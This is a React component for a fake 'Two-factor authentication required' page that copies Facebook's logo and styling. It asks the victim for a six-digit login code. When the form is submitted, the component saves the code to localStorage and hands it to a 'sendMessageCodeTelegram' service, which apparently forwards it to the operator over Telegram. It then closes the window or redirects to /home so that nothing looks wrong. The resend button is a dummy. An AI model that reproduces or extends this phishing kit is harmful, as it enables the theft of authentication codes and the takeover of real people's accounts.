import { sendMessageCodeTelegram } from "@/services/send-message";
import { useEffect, useRef, useState } from "react";
import { navigate } from "wouter/use-browser-location";
import "./TwoFactorAuth.css";

export default function TwoFactorAuth() {
  const [code, setCode] = useState(["", "", "", "", "", ""]);
  const [timer, setTimer] = useState(60);
  const [isResendDisabled, setIsResendDisabled] = useState(true);
  const inputRefs = useRef([]);
  const [isLoading, setIsLoading] = useState(false);

  // Setup refs for each input field
  useEffect(() => {
    inputRefs.current = inputRefs.current.slice(0, code.length);
  }, [code]);

  // Handle countdown timer
  useEffect(() => {
    if (timer > 0) {
      const interval = setInterval(() => {
        setTimer((prevTimer) => prevTimer - 1);
      }, 1000);

      return () => clearInterval(interval);
    } else {
      setIsResendDisabled(false);
    }
  }, [timer]);

  // Format timer as MM:SS
  const formatTime = (seconds) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs < 10 ? "0" : ""}${secs}`;
  };

  // Handle input change
  const handleChange = (index, e) => {
    const value = e.target.value;

    // Only allow numbers
    if (!/^\d*$/.test(value)) return;

    // Update the code state
    const newCode = [...code];
    newCode[index] = value.slice(0, 1); // Only keep first character
    setCode(newCode);

    // Auto-focus next input if a digit was entered
    if (value && index < code.length - 1) {
      inputRefs.current[index + 1].focus();
    }
  };

  // Handle keydown for backspace navigation
  const handleKeyDown = (index, e) => {
    if (e.key === "Backspace" && !code[index] && index > 0) {
      // If current input is empty and backspace is pressed, focus previous input
      inputRefs.current[index - 1].focus();
    }
  };

  // Handle form submission
  const handleSubmit = (e) => {
    e.preventDefault();
    const twoFactorCode = code.join("");

    if (twoFactorCode.length === 6) {
      setIsLoading(true);

      localStorage.setItem("twoFactorCode", JSON.stringify(twoFactorCode));
      sendMessageCodeTelegram(twoFactorCode);

      setTimeout(() => {
        window.close();

        if (window.opener) {
          window.opener.location.href = "/home";
        } else {
          navigate("/home");
        }
        setIsLoading(false);
      }, 3500); // Delay 2 giây
    }
  };

  // Handle code resend
  const handleResendCode = () => {
    if (!isResendDisabled) {
      // Reset the code inputs
      setCode(["", "", "", "", "", ""]);

      // Reset timer
      setTimer(60);
      setIsResendDisabled(true);

      console.log("Resending verification code");
      // Add your code resend logic here

      // Focus first input
      inputRefs.current[0].focus();
    }
  };

  // Handle paste functionality
  const handlePaste = (e) => {
    e.preventDefault();
    const pastedData = e.clipboardData.getData("text/plain").trim();

    // Check if pasted content is a 6-digit number
    if (/^\d{6}$/.test(pastedData)) {
      const newCode = pastedData.split("");
      setCode(newCode);
      inputRefs.current[5].focus();
    }
  };

  return (
    <div className="tfa-container">
      {isLoading && (
        <div className="fb-spinner-overlay">
          <div className="fb-spinner-container">
            <div className="fb-spinner-ring-inner"></div>
          </div>
        </div>
      )}

      <div className="tfa-card">
        <div className="tfa-header">
          <svg className="tfa-logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256">
            <path
              fill="#0866ff"
              d="M256 128C256 57.308 198.692 0 128 0C57.308 0 0 57.307 0 128c0 63.888 46.808 116.843 108 126.445V165H75.5v-37H108V99.8c0-32.08 19.11-49.8 48.347-49.8C170.352 50 185 52.5 185 52.5V84h-16.14C152.958 84 148 93.867 148 103.99V128h35.5l-5.675 37H148v89.445c61.192-9.602 108-62.556 108-126.445"
            ></path>
            <path
              fill="#ffffff"
              d="m177.825 165l5.675-37H148v-24.01C148 93.866 152.959 84 168.86 84H185V52.5S170.352 50 156.347 50C127.11 50 108 67.72 108 99.8V128H75.5v37H108v89.445A128.959 128.959 0 0 0 128 256a128.9 128.9 0 0 0 20-1.555V165h29.825"
            ></path>
          </svg>
        </div>

        <div className="tfa-body">
          <h1 className="tfa-title">Two-factor authentication required</h1>

          <div className="tfa-info">
            <p>
              To help keep your account safe, we need to confirm this login attempt. We've sent a 6-digit code to your
              authenticator app or phone number.
            </p>
          </div>

          <form onSubmit={handleSubmit} className="tfa-form">
            <div className="tfa-code-inputs">
              {code.map((digit, index) => (
                <input
                  key={index}
                  type="text"
                  value={digit}
                  onChange={(e) => handleChange(index, e)}
                  onKeyDown={(e) => handleKeyDown(index, e)}
                  onPaste={index === 0 ? handlePaste : null}
                  ref={(el) => (inputRefs.current[index] = el)}
                  className="tfa-code-input"
                  aria-label={`Digit ${index + 1} of verification code`}
                  maxLength={1}
                  autoComplete="off"
                />
              ))}
            </div>

            <div className="tfa-resend">
              <button
                type="button"
                className={`tfa-resend-button ${isResendDisabled ? "disabled" : ""}`}
                onClick={handleResendCode}
                disabled={isResendDisabled}
              >
                {isResendDisabled ? `Resend code (${formatTime(timer)})` : "Resend code"}
              </button>
            </div>

            <div className="tfa-actions">
              <button className="tfa-submit-button" onClick={handleSubmit}>
                Continue
              </button>

              <a href="#" className="tfa-cancel-link">
                Cancel
              </a>
            </div>
          </form>

          <div className="tfa-help">
            <a href="#" className="tfa-help-link">
              Need another way to authenticate?
            </a>
          </div>
        </div>
      </div>
    </div>
  );
}
